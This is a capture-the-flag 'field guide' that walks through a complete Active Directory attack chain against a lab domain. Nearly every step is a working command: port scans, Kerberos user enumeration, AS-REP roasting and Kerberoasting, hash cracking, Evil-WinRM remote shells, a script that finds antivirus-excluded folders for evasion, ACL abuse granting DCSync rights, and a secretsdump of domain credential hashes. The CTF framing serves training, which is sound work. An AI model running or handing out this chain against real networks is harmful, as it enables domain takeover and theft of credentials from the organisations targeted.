# 🛡️ Cyber Warfare 2025 CTF - Operator Field Guide

This guide walks through common offensive operations used in the CTF scenario. Each command is provided with a brief explanation to help players understand the "why" behind each step.

---

## 🔍 Nmap Reconnaissance

### Full TCP Port Scan (Aggressive Timing)

```bash
sudo nmap -Pn -T5 -p- --open 192.168.68.70
```

- `-Pn`: Skip host discovery, assume host is up  
- `-T5`: Use the most aggressive timing template  
- `-p-`: Scan all 65535 TCP ports  
- `--open`: Only show ports that are open  

---

### Targeted Script & Version Scan

```bash
sudo nmap -sC -sV -r -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -T5 10.3.32.11 --reason --open
```

- `-sC`: Run default scripts  
- `-sV`: Detect service versions  
- `-r`: Scan ports consecutively (no randomization)  
- `--reason`: Show why a port is considered open  
- `--open`: Show only open ports  

---

## 👥 Kerberos Username Enumeration

### Enumerate Potential Usernames

```bash
./kerbrute_linux_amd64 userenum -d l33thackers.stellar.tech --dc 10.3.32.11 /Tools/Wordlists/xato-net-10-million-usernames.txt -o l33tusers.txt
```

- Uses `kerbrute` to identify valid usernames via Kerberos responses.

---

### Clean Up the User List

```bash
cat l33tusers.txt | cut -f 8 -d ' ' | sed 's/@l33thackers.stellar.tech//g' | sort | uniq -i | tee l33tuserscleaned.txt
```

- Extracts usernames, removes domain suffixes, and filters duplicates.

---

## 🔐 AS-REP Roasting

### Request AS-REP Tickets (No Preauth)

```bash
impacket-GetNPUsers -request -usersfile l33tuserscleaned.txt -dc-ip 10.3.32.11 'l33thackers.stellar.tech/' -outputfile l33tpreauthtickets.txt
```

- Finds Kerberos accounts without pre-authentication (AS-REP roastable).

---

### Crack AS-REP Tickets with John the Ripper

```bash
john --wordlist=/Tools/Wordlists/rockyou.txt l33tpreauthtickets.txt
```

- Attempts to crack AS-REP hashes using a wordlist.

---

## 📁 SMB Enumeration & Access

### List Shares

```bash
smbclient -U=l33thackers.stellar.tech/funguy --password=outputfromjohn -L //10.3.32.11
```

### Connect to a Share

```bash
smbclient -U=l33thackers.stellar.tech/funguy --password=outputfromjohn -L \\10.3.32.11\victims
```

- Use `get <filename>` to download files once connected.

---

## 🎯 SPN Enumeration & Kerberoasting

### Enumerate SPNs via LDAP

```bash
ldapsearch -x -H ldap://10.3.32.11 -D 'tou@l33thackers.stellar.tech' -w 'password' -b "DC=l33thackers,DC=stellar,DC=tech" | grep -i -C 5 servicePrincipalName: | grep -i -C 5 @l33t
```

- Searches LDAP for accounts with Service Principal Names (SPNs).

---

### Request SPN Tickets

```bash
impacket-GetUserSPNs -request -dc-ip 10.3.32.11 l33thackers.stellar.tech/tou:'password' -outputfile l33tspnauthtickets.txt
```

- Grabs service tickets to be cracked.

---

### Crack SPN Hashes with Hashcat

```bash
hashcat -m 13100 -a 0 l33tspnauthtickets.txt /Tools/Wordlists/rockyou.txt
```

- Attempts to crack Kerberos service ticket hashes (Kerberoasting).

---

## 💻 Remote Shell Access

### Evil-WinRM Access

```bash
evil-winrm -i 10.3.32.11 -u 'svcsql@l33thackers.stellar.tech' -p 'password'
```

- Opens an interactive remote PowerShell session using Evil-WinRM.

---

## 🧨 BloodHound Enumeration

### Upload & Run SharpHound

```bash
upload SharpHound.exe
.\SharpHound.exe -c all --domain l33thackers.stellar.tech --ldapusername svcsql --ldappassword password
```

---

### AV Bypass Check (Find Excluded Paths)

```powershell
Get-ChildItem -Path "C:\" -Directory -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
  & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "$($_.FullName)\*" 2>&1 |
  Where-Object { $_ -notmatch "failed" } |
  Where-Object { $_ -notmatch "Scan starting..." }
}
```

> If `C:\doom` is excluded, re-upload and rerun `SharpHound` from that directory.

---

## 🧭 Post-Exploitation With PowerView

### Upload & Import PowerView

```powershell
Import-Module .\PowerView.ps1
```

### Enumerate Permissions & ACLs

```powershell
ConvertTo-SID -Identity svcsql
Get-DomainObjectAcl -ResolveGUIDs | Select-String -Pattern "SID" | Select-String -Pattern "Extended" | Select-String -NotMatch -Pattern "svcsql" | Select-String -NotMatch -Pattern "Policies"
```

---

## 🧪 Privilege Escalation

### Reset Password for a User

```powershell
Set-DomainUserPassword -Identity kingjames -AccountPassword (ConvertTo-SecureString 'Password123!!' -AsPlainText -Force) -Verbose
```

### Add User to Admin Group

```powershell
Add-ADGroupMember -Identity 'Stellar Admins' -Members kingjames
```

### Modify ACL for DCSync Rights

```powershell
Import-Module .\PowerView.ps1
$username = "l33thackers.stellar.tech\kingjames"; 
$password = "Password123!!"; 
$secstr = New-Object -TypeName System.Security.SecureString; 
$password.ToCharArray() | ForEach-Object { $secstr.AppendChar($_) }; 
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $secstr;

Add-DomainObjectAcl -Credential $cred -PrincipalIdentity 'kingjames' -TargetIdentity 'l33thackers.stellar.tech\Domain Admins' -Rights DCSync
```

---

## 🧵 Extract Secrets with Impacket

```bash
impacket-secretsdump kingjames:Password123!!@10.3.32.11
```

- Dumps NTLM hashes and secrets from the domain controller.

---

### 🎉 Mission Accomplished

> You've leveraged your skills to enumerate, pivot, escalate, and extract valuable data. Don't forget to document your findings and submit the flag to claim your spot on the scoreboard.
